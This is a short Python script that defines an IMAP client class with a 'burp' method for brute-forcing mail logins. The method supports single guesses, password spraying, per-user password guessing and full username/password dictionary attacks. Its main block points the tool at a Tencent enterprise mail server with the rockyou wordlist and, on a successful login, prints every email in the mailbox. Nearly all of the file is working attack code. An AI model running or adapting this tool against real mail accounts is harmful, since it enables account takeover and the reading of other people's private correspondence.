#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-12-01 09:14:15
# @Author  : owefsad (1528360120@qq.com)
# @Link    : http://blog.51cto.com/executer
# @Version : v_0.1

import imaplib
from imaplib import IMAP4


class OWEFIMAP:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.__connect_server()

    def __connect_server(self):
        try:
            self.serv = imaplib.IMAP4(self.host, self.port)
        # 捕获异常，及时发现是否需要使用IMAP4_SSL来创建serv实例
        except Exception as e:
            raise
        else:
            pass
        finally:
            pass

    def login(self, uname, upass, betch=False):
        try:
            self.serv.login(uname, upass)
            if betch:
                return True
        except IMAP4.error as e:
            if betch == True:
                print("Login failed with account: {name} {passwd}".format(
                    name=uname, passwd=upass))
                return False
            else:
                print("Login fail.")

    def read_emails(self):
        self.serv.select()
        typ, data = self.serv.search(None, 'ALL')

        for num in data[0].split():
            typ, data = self.serv.fetch(num, "(RFC822)")
            print("Message mid={mid}\nmsg={msg}".format(
                mid=num, msg=data[0][1]))

    def burp(self, uname=None, upass=None, uname_file=None, upass_file=None, delay=None):
        '''
        args:
          - uname: 待爆破的用户名
          - upass: 用来爆破的密码
          - uname_file: 待爆破的用户名列表
          - upass_file: 用来爆破的密码字典
          - delay: 两次登陆尝试的时间
        函数支持的4种攻击方式：
          1. 特定用户名、密码登陆尝试
          2. 特定密码，攻击使用密码的用户
          3. 特定用户，攻击其密码
          4. 用户名密码字典攻击
        '''
        try:
            with open(upass_file, 'r') as p:
                pass_list = p.readlines()
        except TypeError as e:
            pass_list = [upass] if upass else None

        try:
            with open(uname_file, 'r') as n:
                name_list = n.readlines()
        except TypeError as e:
            name_list = [uname] if uname else None

        if name_list and pass_list:
            for _pass in pass_list:
                for _name in name_list:
                    _name = _name.strip()
                    _pass = _pass.strip()
                    if self.login(uname=_name, upass=_pass, betch=True):
                        print("Login success with account: {name} {passwd}".format(
                            name=_name, passwd=_pass))
                        return
                    if delay:
                        import time
                        time.sleep(delay)
            print("Login failed.")
        else:
            print("Arguments error. please check.")


if __name__ == "__main__":
    # 各种企业邮箱弱密码爆破脚本
    imap = OWEFIMAP("imap.exmail.qq.com", 143)
    imap.burp(uname="xxxxxxxx@xx.com",
              upass_file="/usr/share/wordlists/rouckyou.txt")
    imap.read_emails()
